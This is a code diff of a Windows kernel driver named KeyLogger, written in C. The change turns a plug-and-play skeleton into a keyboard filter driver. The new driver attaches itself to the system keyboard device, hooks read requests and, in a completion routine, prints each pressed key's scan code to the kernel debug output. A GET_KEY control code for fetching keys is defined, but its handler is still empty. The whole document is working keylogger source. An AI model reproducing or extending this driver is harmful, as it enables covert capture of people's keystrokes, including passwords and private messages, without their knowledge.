@@ -1,4 +1,5 @@
 #include <ntddk.h>
+#include <ntddkbd.h>
 #include <tchar.h>
 
 #pragma warning(disable: 5045) //Disable Spectre
@@ -15,143 +16,184 @@
 #define KEYBOARD_DEVICE_PATH				\
 	_T("\\Device\\") KEYBOARD_DEVICE_NAME
 
-#define SYM_LINK_NAME					\
+#define SYMBOLIC_LINK_NAME				\
 	_T("\\DosDevices\\KeyLogger")
 
-#define NULLASSERT(p)					\
-	if (!p) return STATUS_BUFFER_ALL_ZEROS
+#define IOCTL(CODE)						\
+	CTL_CODE(							\
+		FILE_DEVICE_UNKNOWN,			\
+		0x800 + CODE,					\
+		METHOD_BUFFERED,				\
+		FILE_ANY_ACCESS)
 
-#define NOTUSED(var)					\
-	(VOID)var
+#define GET_KEY IOCTL(1)
 
-#define LOG(msg)						\
-	DbgPrint(" === " msg " === ")
+#pragma pack(push, 1)
 
-
-struct _DEVICE_EXTENSION
+typedef struct _DEVICE_EXTENSION
 {
-	UNICODE_STRING symbolicLink;
-	PDEVICE_OBJECT pTargetDeviceObj;
-};
+	PDEVICE_OBJECT pTargetDeviceObject;
 
-typedef struct _DEVICE_EXTENSION DEVICE_EXTENSION;
-typedef DEVICE_EXTENSION *PDEVICE_EXTENSION;
+} DEVICE_EXTENSION, *PDEVICE_EXTENSION;
 
+#pragma pack(pop)
+
+VOID
+UnloadRoutine(
+	PDRIVER_OBJECT pDriverObject)
+{
+	PDEVICE_EXTENSION pDeviceExtension = pDriverObject->DeviceObject->DeviceExtension;
+
+	IoDetachDevice(pDeviceExtension->pTargetDeviceObject);
+	IoDeleteDevice(pDriverObject->DeviceObject);
+}
 
 NTSTATUS
-AddDeviceRoutine(
-	_In_ PDRIVER_OBJECT pDriverObject,
-	_In_ PDEVICE_OBJECT pPhysicalDeviceObject)
+IrpForwarding(
+	PDEVICE_OBJECT pDeviceObject,
+	PIRP pIrp)
 {
-	NOTUSED(pPhysicalDeviceObject);
-	NOTUSED(pDriverObject);
+	IoSkipCurrentIrpStackLocation(pIrp);
+
+	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;
+	return IoCallDriver(pDeviceExtension->pTargetDeviceObject, pIrp);
+}
+
+NTSTATUS
+HookCompletionRoutine(
+	PDEVICE_OBJECT pDeviceObject,
+	PIRP pIrp,
+	PVOID pContext)
+{
+	UNREFERENCED_PARAMETER(pContext);
+
+	if (NT_SUCCESS(pIrp->IoStatus.Status))
+	{
+		PKEYBOARD_INPUT_DATA keyInfo = pIrp->AssociatedIrp.SystemBuffer;
+
+		if (!keyInfo->Flags)
+			DbgPrint("KeyLogger: %hu", keyInfo->MakeCode);
+	}
+
+	ObfDereferenceObject(pDeviceObject);
+
+	if (pIrp->PendingReturned)
+		IoMarkIrpPending(pIrp);
+
+	return pIrp->IoStatus.Status;
+}
+
+NTSTATUS
+HookRoutine(
+	PDEVICE_OBJECT pDeviceObject,
+	PIRP pIrp)
+{
+	IoCopyCurrentIrpStackLocationToNext(pIrp);
+
+	NTSTATUS returnedStatus = IoSetCompletionRoutineEx(
+		pDeviceObject, pIrp,
+		HookCompletionRoutine,
+		NULL, TRUE, TRUE, TRUE);
+
+	if (!NT_SUCCESS(returnedStatus))
+		IoSkipCurrentIrpStackLocation(pIrp);
+	else
+		ObfReferenceObject(pDeviceObject);
+
+	PDEVICE_EXTENSION pDeviceExtencion = pDeviceObject->DeviceExtension;
+	return IoCallDriver(pDeviceExtencion->pTargetDeviceObject, pIrp);
+}
+
+NTSTATUS
+CompleteIrp(
+	PIRP pIrp,
+	NTSTATUS ntStatus,
+	ULONG info)
+{
+	pIrp->IoStatus.Status = ntStatus;
+	pIrp->IoStatus.Information = info;
+
+	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+	return ntStatus;
+}
+
+NTSTATUS
+DeviceControlRoutine(
+	PDEVICE_OBJECT pDeviceObject,
+	PIRP pIrp)
+{
+	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
+	ULONG controlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
+	NTSTATUS exitCode = STATUS_SUCCESS;
+	ULONG bytesSnd = 0;
+
+	switch (controlCode)
+	{
+		case GET_KEY:
+		{
+			break;
+		}
+
+		default:
+			exitCode = STATUS_INVALID_PARAMETER;
+	}
+
+	return CompleteIrp(pIrp, exitCode, bytesSnd);
+}
+
+NTSTATUS
+DriverEntry(
+	PDRIVER_OBJECT pDriverObject,
+	PUNICODE_STRING pRegistryPath)
+{
+	UNREFERENCED_PARAMETER(pRegistryPath);
+
+	for (INT i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; ++i)
+		pDriverObject->MajorFunction[i] = IrpForwarding;
+
+	pDriverObject->MajorFunction[IRP_MJ_READ] = HookRoutine;
+	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlRoutine;
+	pDriverObject->DriverUnload = UnloadRoutine;
+
+	NTSTATUS returnedStatus;
 
 	UNICODE_STRING deviceName;
 	RtlInitUnicodeString(&deviceName, DEVICE_PATH);
-
-	PDEVICE_OBJECT pDeviceObj;
-	NTSTATUS returnedStatus = STATUS_SUCCESS;
+	
+	PDEVICE_OBJECT pDeviceObject;
 
 	returnedStatus = IoCreateDevice(
 		pDriverObject,
 		sizeof(DEVICE_EXTENSION),
 		&deviceName,
-		FILE_DEVICE_UNKNOWN,
-		0,
-		FALSE,
-		&pDeviceObj);
-
+		FILE_DEVICE_KEYBOARD,
+		0, FALSE,
+		&pDeviceObject);
+	
 	if (!NT_SUCCESS(returnedStatus))
 		return returnedStatus;
 
-	PDEVICE_EXTENSION pDeviceExtension = pDeviceObj->DeviceExtension;
-	NULLASSERT(pDeviceExtension);
+	pDeviceObject->Flags =
+		DO_BUFFERED_IO |
+		DO_POWER_PAGABLE |
+		DO_DEVICE_HAS_NAME |
+		DRVO_LEGACY_RESOURCES;
 
 	UNICODE_STRING targetDeviceName;
 	RtlInitUnicodeString(&targetDeviceName, KEYBOARD_DEVICE_PATH);
 
-	PFILE_OBJECT pFileObj;
-	returnedStatus = IoGetDeviceObjectPointer(
+	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;
+
+	returnedStatus = IoAttachDevice(
+		pDeviceObject,
 		&targetDeviceName,
-		FILE_READ_DATA,
-		&pFileObj,
-		&pDeviceExtension->pTargetDeviceObj);
+		&pDeviceExtension->pTargetDeviceObject);
 
 	if (!NT_SUCCESS(returnedStatus))
-		return returnedStatus;
-
-	IoAttachDeviceToDeviceStack(pDeviceObj, pDeviceExtension->pTargetDeviceObj);
-
-	returnedStatus =
-		IoCreateSymbolicLink(&pDeviceExtension->symbolicLink, &deviceName);
-
-	if (!NT_SUCCESS(returnedStatus))
-		return returnedStatus;
-
-	return returnedStatus;
-}
-
-
-NTSTATUS
-ForwardingIRP(
-	_In_ PDEVICE_OBJECT pDevObj,
-	_In_ PIRP pIrp)
-{
-	IoSkipCurrentIrpStackLocation(pIrp);
-
-	PDEVICE_EXTENSION pDeviceExtension = pDevObj->DeviceExtension;
-	NULLASSERT(pDeviceExtension);
-
-	return IoCallDriver(pDeviceExtension->pTargetDeviceObj, pIrp);
-}
-
-
-NTSTATUS
-PnPHandler(
-	_In_ PDEVICE_OBJECT pDevObj,
-	_In_ PIRP pIrp)
-{
-	PIO_STACK_LOCATION pIrpStackLocation =
-		IoGetCurrentIrpStackLocation(pIrp);
-
-	NULLASSERT(pIrpStackLocation);
-
-	switch (pIrpStackLocation->MinorFunction)
 	{
-		case IRP_MN_START_DEVICE:
-		{
-			LOG("Driver: start");
-			break;
-		}
-
-		case IRP_MN_STOP_DEVICE:
-		{
-			LOG("Driver: stop");
-			break;
-		}
+		IoDeleteDevice(pDeviceObject);
+		return returnedStatus;
 	}
 
-	return ForwardingIRP(pDevObj, pIrp);
-}
-
-
-NTSTATUS
-DriverEntry(
-	_In_ PDRIVER_OBJECT pDriverObject,
-	_In_ PUNICODE_STRING pRegistryPath)
-{
-	NOTUSED(pRegistryPath);
-
-	NULLASSERT(pDriverObject);
-	NULLASSERT(pDriverObject->DriverExtension);
-	NULLASSERT(pDriverObject->MajorFunction);
-
-	pDriverObject->DriverExtension->AddDevice = AddDeviceRoutine;
-
-	for (INT i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
-		pDriverObject->MajorFunction[i] = ForwardingIRP;
-
-	pDriverObject->MajorFunction[IRP_MJ_PNP] = PnPHandler;
-
-	return STATUS_SUCCESS;
+	return returnedStatus;
 }
